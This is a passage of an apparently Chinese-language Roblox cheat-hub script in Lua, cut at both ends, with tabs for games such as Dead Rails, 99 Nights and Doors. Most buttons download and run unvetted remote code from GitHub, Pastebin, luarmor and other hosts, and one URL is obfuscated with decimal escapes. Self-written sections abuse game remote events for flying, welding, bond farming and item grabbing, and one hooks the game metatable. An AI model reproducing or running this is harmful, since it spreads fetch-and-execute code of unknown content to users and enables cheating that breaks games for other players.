SaveBtn.TextSize = 16
SaveBtn.Parent = Container

local posCount = 0

SaveBtn.MouseButton1Click:Connect(function()
    local char = Player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    -- 记录坐标
    local savedCFrame = char.HumanoidRootPart.CFrame
    posCount = posCount + 1
    
    -- 生成传送按钮
    local TpBtn = Instance.new("TextButton")
    TpBtn.Size = UDim2.new(1, 0, 0, 35)
    TpBtn.Text = "位置 " .. posCount .. " (点击传送)"
    TpBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    TpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    TpBtn.Font = Enum.Font.SourceSans
    TpBtn.TextSize = 16
    TpBtn.Parent = Container
    
    -- 传送逻辑
    TpBtn.MouseButton1Click:Connect(function()
        if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
            Player.Character.HumanoidRootPart.CFrame = savedCFrame
        end
    end)
end)
        WindUI:Notify({
            Title = "简洁",
            Content = "加载成功",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "无限动作",
    Desc = "其他人可见",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "踹飞别人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-DropKick-Script-165813"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "自由视角",
    Desc = "可以飞到哪，传送到哪",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/sKQ1mSGy"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "死铁轨",
    Icon = "train-track",
    Locked = false,
})

local Section = Tab:Section({ 
    Title = "--------------自制脚本--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "无限制焊接",
    Desc = "仅限木制列车可以做其他的火车，但是懒得做",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local network = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Universe"):WaitForChild("Network")
local weldRemote = network:WaitForChild("RemoteEvent"):WaitForChild("Weld")

-- ================= [配置] =================
local FIXED_PATH = workspace:FindFirstChild("wooden") -- 固定目标
-- ==========================================

-- 创建微型可拖动UI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "WeldTool"
screenGui.ResetOnSpawn = false

local weldBtn = Instance.new("TextButton", screenGui)
weldBtn.Size = UDim2.new(0, 60, 0, 30) -- 小按钮尺寸
weldBtn.Position = UDim2.new(0, 50, 0, 200)
weldBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
weldBtn.Text = "焊接"
weldBtn.TextColor3 = Color3.new(1, 1, 1)
weldBtn.BorderSizePixel = 1
weldBtn.Draggable = true -- 启用基础拖拽（兼容移动端）

-- UI 圆角
local corner = Instance.new("UICorner", weldBtn)
corner.CornerRadius = UDim.new(0, 6)

-- 获取物体的 serverEntity ID
local function getID(obj)
    if not obj then return nil end
    return obj:GetAttribute("serverEntity")
end

-- 射线检测准心瞄准的物体
local function getTargetUnderCursor()
    local viewportSize = camera.ViewportSize
    local center = Vector2.new(viewportSize.X / 2, viewportSize.Y / 2)
    local ray = camera:ViewportPointToRay(center.X, center.Y)
    
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {player.Character} -- 排除自己
    
    local result = workspace:Raycast(ray.Origin, ray.Direction * 500, params) -- 射线距离500米
    
    if result and result.Instance then
        -- 尝试寻找该物体或其父级是否有 ID
        local target = result.Instance
        local id = getID(target) or getID(target.Parent)
        return id, target.Name
    end
    return nil, nil
end

-- 按钮点击逻辑
weldBtn.MouseButton1Click:Connect(function()
    -- 1. 获取固定物品 ID
    local fixedId = getID(FIXED_PATH)
    if not fixedId then
       
        weldBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- 变红提示
        task.wait(0.5)
        weldBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        return
    end

    -- 2. 射线获取瞄准物品 ID
    local aimId, aimName = getTargetUnderCursor()
    
    if aimId then
        local args = {
            tonumber(aimId),   -- 射线检测到的 ID (原2498位置)
            tonumber(fixedId)  -- workspace.wooden 的 ID (原2426位置)
        }
        
        -- 3. 发送焊接请求
        weldRemote:FireServer(unpack(args))
        
        
        -- 点击反馈效果
        weldBtn.Text = "成功"
        weldBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        task.wait(0.5)
        weldBtn.Text = "焊接"
        weldBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    else
    end
end)

-- 简单的UI拖拽优化 (针对手机触摸)
local dragging, dragInput, dragStart, startPos
weldBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = weldBtn.Position
    end
end)

weldBtn.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        weldBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
        WindUI:Notify({
            Title = "使用请勿乱甩焊接",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "死铁轨无拉回飞行",
    Desc = "使用方法得选马职业没有的可以去找一头已经装了马鞍的马直接靠近马点击开启飞行就行不要坐在马身上，停止飞行请同时丢🐴和关闭飞行✌️",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local PlayerModule = require(player.PlayerScripts:WaitForChild("PlayerModule"))
local controls = PlayerModule:GetControls()

-----------------------------------
-- 1. UI 构建
-----------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HorseFlyUI_V2"
screenGui.ResetOnSpawn = false
local success = pcall(function() screenGui.Parent = CoreGui end)
if not success then screenGui.Parent = player:WaitForChild("PlayerGui") end

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 160, 0, 120)
mainFrame.Position = UDim2.new(0.1, 0, 0.2, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

local topBar = Instance.new("Frame", mainFrame)
topBar.Size = UDim2.new(1, 0, 0, 25)
topBar.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
topBar.BorderSizePixel = 0
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel", topBar)
title.Size = UDim2.new(1, -50, 1, 0)
title.BackgroundTransparency = 1
title.Text = " 飞行控制面板"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left

local minBtn = Instance.new("TextButton", topBar)
minBtn.Size = UDim2.new(0, 25, 0, 25)
minBtn.Position = UDim2.new(1, -50, 0, 0)
minBtn.BackgroundTransparency = 1
minBtn.Text = "-"
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.TextSize = 18

local closeBtn = Instance.new("TextButton", topBar)
closeBtn.Size = UDim2.new(0, 25, 0, 25)
closeBtn.Position = UDim2.new(1, -25, 0, 0)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.TextSize = 16

local content = Instance.new("Frame", mainFrame)
content.Size = UDim2.new(1, 0, 1, -25)
content.Position = UDim2.new(0, 0, 0, 25)
content.BackgroundTransparency = 1

local toggleFlyBtn = Instance.new("TextButton", content)
toggleFlyBtn.Size = UDim2.new(0.8, 0, 0, 30)
toggleFlyBtn.Position = UDim2.new(0.1, 0, 0.1, 0)
toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
toggleFlyBtn.Text = "开启飞行"
toggleFlyBtn.TextColor3 = Color3.new(1, 1, 1)
toggleFlyBtn.Font = Enum.Font.SourceSansBold
toggleFlyBtn.TextSize = 16
Instance.new("UICorner", toggleFlyBtn).CornerRadius = UDim.new(0, 6)

local speedInput = Instance.new("TextBox", content)
speedInput.Size = UDim2.new(0.8, 0, 0, 30)
speedInput.Position = UDim2.new(0.1, 0, 0.55, 0)
speedInput.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
speedInput.Text = "50"
speedInput.PlaceholderText = "速度"
speedInput.TextColor3 = Color3.new(1, 1, 1)
speedInput.Font = Enum.Font.SourceSans
speedInput.TextSize = 16
Instance.new("UICorner", speedInput).CornerRadius = UDim.new(0, 6)

-----------------------------------
-- 2. UI 拖拽与逻辑
-----------------------------------
local dragging, dragInput, dragStart, startPos
topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

local minimized = false
minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    content.Visible = not minimized
    mainFrame.Size = minimized and UDim2.new(0, 160, 0, 25) or UDim2.new(0, 160, 0, 120)
end)
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

-----------------------------------
-- 3. 业务逻辑 (等待1秒 + 动态ID)
-----------------------------------
local isFlying = false
local isProcessing = false 
local flightSpeed = 50
local flyConnection

-- 获取马及其 serverEntity 属性
local function getNearestHorseData()
    local nearest, minDist, horseId = nil, math.huge, nil
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name == "Model_Horse" then
            local pPart = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
            if pPart then
                local dist = (pPart.Position - rootPart.Position).Magnitude
                if dist < minDist then
                    local entityId = obj:GetAttribute("serverEntity")
                    if entityId then
                        minDist = dist
                        nearest = obj
                        horseId = entityId
                    end
                end
            end
        end
    end
    return nearest, horseId
end

local function startFlightLoop()
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    
    flyConnection = RunService.RenderStepped:Connect(function()
        if not isFlying then return end
        
        rootPart.Velocity = Vector3.new(0, 0, 0)
        rootPart.RotVelocity = Vector3.new(0, 0, 0)
        
        local camCFrame = workspace.CurrentCamera.CFrame
        local moveVector = controls:GetMoveVector() 
        
        local flyDirection = (camCFrame.LookVector * (moveVector.Z * -1)) + (camCFrame.RightVector * moveVector.X)
        if flyDirection.Magnitude > 0 then
            flyDirection = flyDirection.Unit
            rootPart.CFrame = rootPart.CFrame + (flyDirection * (flightSpeed / 60))
        end
        
        rootPart.CFrame = CFrame.new(rootPart.Position, rootPart.Position + camCFrame.LookVector)
    end)
end

toggleFlyBtn.MouseButton1Click:Connect(function()
    if isProcessing then return end
    
    if isFlying then
        isFlying = false
        toggleFlyBtn.Text = "开启飞行"
        toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
        if flyConnection then flyConnection:Disconnect() end
    else
        isProcessing = true
        toggleFlyBtn.Text = "检测马匹..."
        
        local horse, id = getNearestHorseData()
        
        if horse and id then
            toggleFlyBtn.Text = "收马中..."
            toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
            
            -- 1. 尝试坐下
            local seat = horse:FindFirstChildWhichIsA("VehicleSeat") or horse:FindFirstChildWhichIsA("Seat")
            if seat then seat:Sit(humanoid) end
            
            -- 2. 拿出 Sack (检查背包和身上)
            local sack = player.Backpack:FindFirstChild("Sack") or (player.Character and player.Character:FindFirstChild("Sack"))
            if sack then humanoid:EquipTool(sack) end
            
            -- 3. 发送动态 ID
            pcall(function()
                ReplicatedStorage.Shared.Universe.Network.RemoteEvent.Store:FireServer(id)
            end)
            
            -- 修改点：此处改为等待 1 秒
            task.wait(1)
        else
            warn("未发现可收起的马匹，直接开启飞行")
            task.wait(0.2)
        end
        
        isProcessing = false
        isFlying = true
        toggleFlyBtn.Text = "关闭飞行"
        toggleFlyBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
        startFlightLoop()
    end
end)

speedInput.FocusLost:Connect(function()
    local newSpeed = tonumber(speedInput.Text)
    if newSpeed then flightSpeed = newSpeed else speedInput.Text = tostring(flightSpeed) end
end)
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "红叶脚本好用👍",
    TextXAlignment = "Left",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "红叶汉化",
    Desc = "点完后点下面一个",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/stghongye.lua"))()
        WindUI:Notify({
            Title = "红叶子汉化",
            Content = "副包",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "红叶汉化",
    Desc = "点完这个就可以用了",
    Locked = false,
    Callback = function()
        script_key="这里填你的卡密";
(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
        WindUI:Notify({
            Title = "红叶子汉化",
            Content = "主包",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------刷债券--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "刷债券(若黑屏点下屏幕即可)",
    Desc = "非常好用不解卡",
    Locked = false,
    Callback = function()
        getgenv().BondFarmSetting = {
	Fast_Auto_Execute = true, -- Use queue_on_teleport to execute faster than your executor itself 
	Number_Of_Bonds_Targeted = 9e9, -- When your bonds reached the number you wanted, the will script automatically be stopped
	Tween_Duration = 23, -- The smaller number, the faster it goes (best is 23)
	Webhook_Url = "none",
	Main_Auto_SHOP_Delay = 70, -- auto server hop after time ended in main game
	Lobby_Auto_SHOP_Delay = 25, -- auto server hop after time ended in lobby
	Goto_Party_By_Walking_Only = false, -- if you set to false, it instantly teleport you to party creator, else it make you walk to party creator 
	Blackscreen_Save_Battery = true,
	Show_Bonds_Collected_On_Blackscreen = false
}
SaveNewSettings = true 
script_key = "DonjoSx_Was_Not_Here" -- Script key, don't remove this
loadstring(game:HttpGet("https://raw.githubusercontent.com/Umbrella-Scripter/Deadrails-Script/refs/heads/main/average-bond-farm.lua"))()
        WindUI:Notify({
            Title = "好用",
            Content = "不用解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "死铁轨",
    Desc = "要解卡",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
        WindUI:Notify({
            Title = "有点老爷",
            Content = "老爷",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Tx",
    Desc = "刷债券",
    Locked = false,
    Callback = function()
        --[[by 退休不退休]]
QUN = "160369111"
TX = "退休脚本"
BY = "退休"
script = "死铁轨免费刷债券"
loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/%E5%88%B7%E5%80%BA%E5%88%B8"))()
        WindUI:Notify({
            Title = "老爷刷债券",
            Content = "不用卡密",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "自动刷债券",
    Desc = "要卡密",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        WindUI:Notify({
            Title = "没用过",
            Content = "不知道咋样",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "刷债券",
    Desc = "要卡密",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
        WindUI:Notify({
            Title = "还行",
            Content = "没用过",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "v5刷债券",
    Desc = "最好用的",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/m00ndiety/Moondiety/refs/heads/main/Loader'))()
        WindUI:Notify({
            Title = "刷债券",
            Content = "要解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------实用脚本区--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "xk脚本",
    Desc = "有焊接",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DevSloPo/Main/refs/heads/main/DeadRail"))()
        WindUI:Notify({
            Title = "xk脚本",
            Content = "加载成功…",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "99夜",
    Icon = "shield",
    Locked = false,
})

local Button = Tab:Button({
    Title = "虚空",
    Desc = "汉化版",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/atnew2025/Chinese-scripts/refs/heads/main/voidware-cn.txt"))()
        WindUI:Notify({
            Title = "虚空汉化",
            Content = "好用",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "99夜无敌脚本",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/森林中的99夜.lua"))()
        WindUI:Notify({
            Title = "好用",
            Content = "汉化版",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------脚本分割线--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "同一个老外做外卡密通用",
    TextXAlignment = "Left",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "99夜最无敌",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/99%E5%A4%9C%E6%B1%89%E5%8C%96.txt"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某汉化",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "99夜刷糖果",
    Desc = "要解卡",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/c87b3621b22ecc2c8b474f95c47ecb40.lua'))()
        WindUI:Notify({
            Title = "好用",
            Content = "要解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "99夜刷砖石",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/8ee53a2a2e39163362c725415e1307ab.lua'))()
        WindUI:Notify({
            Title = "好用",
            Content = "要解卡",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Section = Tab:Section({ 
    Title = "--------------脚本分割线--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Tab = Window:Tab({
    Title = "doors",
    Icon = "door-open",
    Locked = false,
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化1",
    Locked = false,
    Callback = function()
          loadstring(game:HttpGet("https://velocityloader.vercel.app/"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某寻找",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Paragraph = Tab:Paragraph({
    Title = "上面的卡密",
    Desc = "点击复制按钮获取卡密",
    Color = Color3.fromHex("#FFD700"), -- 改为金色
    Image = "",
    ImageSize = 30,
    Thumbnail = "",
    ThumbnailSize = 80,
    Locked = false,
    Buttons = {
        {
            Icon = "crown",
            Title = "复制",
            Callback = function()
                local cardKey = "VelocityXFreeDoorsKey" 
                if setclipboard then
                    setclipboard(cardKey)
                    WindUI:Notify({
                        Title = "卡密复制",
                        Content = "卡密已复制到剪贴板: " .. cardKey,
                        Icon = "crown",
                        Duration = 5
                    })
                    print("卡密已复制: " .. cardKey)
                else
                    WindUI:Notify({
                        Title = "错误",
                        Content = "复制功能不可用",
                        Icon = "crown",
                        Duration = 3
                    })
                end
            end,
        }
    }
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化2",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/atnew2025/Chinese-scripts/refs/heads/main/mshax(prohax).txt"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化3",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://www.msdoors.xyz/script"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "doors",
    Desc = "汉化4",
    Locked = false,
    Callback = function()
          --[[Doors Blackking And BobHub脚本汉化]]loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
        WindUI:Notify({
            Title = "好用",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "奶奶:多人游戏",
    Icon = "crown",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "自制",
    Desc = "还行",
    Locked = false,
    Callback = function()
        local TargetPattern = 'Set "(.*)" to auto load'

local Replacement = '设置 "%1" 为自动加载'


local Translations = {

["Configuration"] = "配置",

["Config name"] = "配置名称",

["Create config"] = "创建配置",

["Created config"] = "创建的配置",

["Invalid config name (empty)"] = "无效的配置名称(空)",

["Config list"] = "配置列表",

["Load config"] = "加载配置",

["Overwrite config"] = "覆盖配置",

["Delete config"] = "删除配置",

["Refresh list"] = "刷新列表",

["Set as autoload"] = "设置为自动加载",

["Reset autoload"] = "重置自动加载",

["Current autoload config: none"] = "当前自动加载配置:无",

["none"] = "无",

["Failed to set autoload config: write file error"] = "无法设置自动加载配置：写入文件错误",

["Failed to load config: no config file is selected"] = "加载配置失败：未选择配置文件",

["Failed to overwrite config: no config file is selected"] = "覆盖配置失败：未选择配置文件",

["Failed to delete config: no config file is selected"] = "删除配置失败：未选择配置文件",

["Set autoload to none"] = "将自动加载设置为无",

["Loaded config"] = "已加载配置",

["Overwrote config"] = "覆盖配置",

["Deleted config"] = "删除配置",

["Failed to load autoload config: invalid file"] = "加载自动加载配置失败：文件无效",

["Auto loaded config"] = "自动加载配置",

["Themes"] = "主题",

["Background color"] = "背景颜色",

["Main color"] = "主色",

["Accent color"] = "强调色",

["Outline color"] = "轮廓色",

["Font color"] = "字体颜色",

["Font Face"] = "字体",

["Code"] = "代码",

["Theme list"] = "主题列表",

["Set as default"] = "将作为默认",

["Custom theme name"] = "自定义主题名称",

["Create theme"] = "创建主题",

["Custom themes"] = "自定义主题",

["Load theme"] = "加载主题",

["Overwrite theme"] = "覆盖主题",

["Delete theme"] = "删除主题",

["Reset default"] = "重置为默认",

["Current autoload config: "] = "当前自动加载配置:",

["Set default theme to nothing"] = "将默认主题重置",

["Invalid theme name (empty)"] = "主题名称无效（空）",

["Failed to delete theme: no config file is selected"] = "删除主题失败：未选择配置文件",

["Created theme"] = "创建主题",

["Loaded theme"] = "已加载主题",

["Deleted theme"] = "删除主题",

["Set default theme to"] = "将默认主题设置为",

}


local function translateText(text)

if not text or type(text) ~= "string" then return text end

if Translations[text] then return Translations[text] end

local match = text:match(TargetPattern)

if match then

return Replacement:gsub("%%1", match)

end


for en, cn in pairs(Translations) do

if text:find(en, 1, true) then return text:gsub(en, cn) end

end

return text

end

local mt = getrawmetatable(game)

local old_newindex = mt.__newindex

setreadonly(mt, false)


mt.__newindex = newcclosure(function(t, k, v)

if k == "Text" and (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) then

v = translateText(tostring(v))

end

if k == "ImageColor3" and t:IsA("ImageLabel") then

v = Color3.fromRGB(255, 255, 255)

end

return old_newindex(t, k, v)

end)

setreadonly(mt, true)


local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/-/refs/heads/main/UI.lua"))()

local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()

local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()


local Window = Library:CreateWindow({

Title = "恐怖老奶",

Footer = "版本: 1.0.0 | 作者: 刘某", 

NotifySide = "Right",

ShowCustomCursor = true,

})


local Tabs = { 

Main = Window:AddTab("第一章", "album"),

Main1 = Window:AddTab("第二章", "album"),

Main2 = Window:AddTab("第三章", "album"),

['UI Settings'] = Window:AddTab("UI 设置", "settings")

}


local GroupBox = Tabs.Main:AddLeftGroupbox("获取道具", "gem")

GroupBox:AddButton({Text = "点击获取弩", Func = function()

-- 获取当前执行脚本的玩家对象

local LocalPlayer = game:GetService("Players").LocalPlayer


local args = {

[1] = LocalPlayer

}


-- 触发远程事件

workspace:WaitForChild("General Items"):WaitForChild("Crossbow"):WaitForChild("InteractRemote"):FireServer(unpack(args))

end

})


GroupBox:AddButton({Text = "点击获取弩箭", Func = function()

local lp = game:GetService("Players").LocalPlayer


-- 1. 遍历 workspace 寻找名字里包含 "Preset" 的文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if string.find(folder.Name, "Preset") then

local ammoFolder = folder:FindFirstChild("Ammo")

if ammoFolder then

-- 2. 在 Ammo 文件夹里寻找 Bolt1, Bolt2, Bolt3

for _, item in ipairs(ammoFolder:GetChildren()) do

if string.find(item.Name, "Bolt[1-3]") then

local remote = item:FindFirstChild("InteractRemote")

if remote then

-- 3. 触发补给远程事件

remote:FireServer(lp)

end

end

end

end

end

end


-- 4. 触发弩装载逻辑 (针对背包中的 Crossbow)

local backpack = lp:FindFirstChild("Backpack")

if backpack then

local crossbow = backpack:FindFirstChild("Crossbow")

if crossbow and crossbow:FindFirstChild("Loaded") then

crossbow.Loaded:FireServer()

end

end

end

})


GroupBox:AddToggle('AutoSupplyToggle', {

Text = '持续换弩箭子弹',

Default = false,

Callback = function(Value)

_G.AutoFarmActive = Value

if Value then

task.spawn(function()

local lp = game:GetService("Players").LocalPlayer

while _G.AutoFarmActive do

-- 1. 动态遍历 Workspace 寻找 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

-- 匹配名字里带 Preset 的对象

if string.find(folder.Name, "Preset") then

local ammoFolder = folder:FindFirstChild("Ammo")

if ammoFolder then

-- 2. 在 Ammo 文件夹里匹配 Bolt1 到 Bolt3

for _, item in ipairs(ammoFolder:GetChildren()) do

if string.find(item.Name, "Bolt[1-3]") then

local remote = item:FindFirstChild("InteractRemote")

if remote then

remote:FireServer(lp)

end

end

end

end

end

end

-- 3. 触发弩装载逻辑

local backpack = lp:FindFirstChild("Backpack")

if backpack then

local crossbow = backpack:FindFirstChild("Crossbow")

if crossbow and crossbow:FindFirstChild("Loaded") then

-- 有些游戏装载也需要参数，这里保持你原始的无参触发

crossbow.Loaded:FireServer()

end

end

task.wait(0.1) -- 严格执行 0.1 秒间隔

end

end)

end

end

})


GroupBox:AddButton({Text = "点击获取辣椒水", Func = function()

local lp = game:GetService("Players").LocalPlayer


local args = {

[1] = lp

}


-- 触发辣椒喷雾（Pepper spray）的远程事件

workspace:WaitForChild("General Items"):WaitForChild("Pepper spray"):WaitForChild("InteractRemote"):FireServer(unpack(args))

end

})


GroupBox:AddButton({Text = "点击获取枪", Func = function()

local lp = game:GetService("Players").LocalPlayer

local char = lp.Character or lp.CharacterAdded:Wait()


-- 1. 获取三个部件

for _, folder in ipairs(workspace:GetChildren()) do

if string.find(folder.Name, "Preset") then

for i = 1, 3 do

local itemName = "A part of a shotgun (" .. i .. ")"

local item = folder:FindFirstChild(itemName)

if item then

local remote = item:FindFirstChild("InteractRemote")

if remote then

remote:FireServer(lp)

task.wait(0.05)

end

end

end

end

end


-- 2. 传送到你记录的坐标

local targetPos = Vector3.new(-293.21, -18.39, 5.96)

char:PivotTo(CFrame.new(targetPos))

